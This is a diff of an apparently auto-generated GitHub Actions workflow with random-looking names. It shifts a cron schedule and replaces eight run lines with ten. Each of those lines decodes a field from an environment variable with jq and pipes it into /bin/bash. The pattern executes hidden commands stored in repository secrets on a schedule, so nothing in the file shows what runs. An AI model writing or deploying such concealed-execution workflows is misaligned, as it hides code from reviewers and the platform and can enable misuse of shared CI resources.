@@ -2,23 +2,24 @@ name: lijun19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 5/6 * * *'
+    - cron: '36 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lijun19871010
         env:
-          zvvs74: ${{ secrets.zvvs74 }}
+          rrp86737: ${{ secrets.rrp86737 }}
         run: |
-          echo $zvvs74 | jq -r .tbdok3870 | /bin/bash
-          echo $ns21880 | jq -r .bdoed1335 | /bin/bash
-          echo $udqu586 | jq -r .tcuno4 | /bin/bash
-          echo $j321 | jq -r .y778 | /bin/bash
-          echo $evug4 | jq -r .mfc03604 | /bin/bash
-          echo $ya081 | jq -r .lkukn895 | /bin/bash
-          echo $aw05439 | jq -r .rysh4795 | /bin/bash
-          echo $mix6 | jq -r .rcixl9650 | /bin/bash
+          echo $rrp86737 | jq -r .adkq506 | /bin/bash
+          echo $brq14 | jq -r .lbsrb5 | /bin/bash
+          echo $wrd296 | jq -r .mymaz6 | /bin/bash
+          echo $jcx370 | jq -r .gkrop022 | /bin/bash
+          echo $f5 | jq -r .fwvx6216 | /bin/bash
+          echo $opbif27306 | jq -r .z53732 | /bin/bash
+          echo $l9 | jq -r .ivnm89 | /bin/bash
+          echo $z4985 | jq -r .fhseq210 | /bin/bash
+          echo $g1804 | jq -r .joxno81806 | /bin/bash
+          echo $pplvb63 | jq -r .rzeb18670 | /bin/bash
 
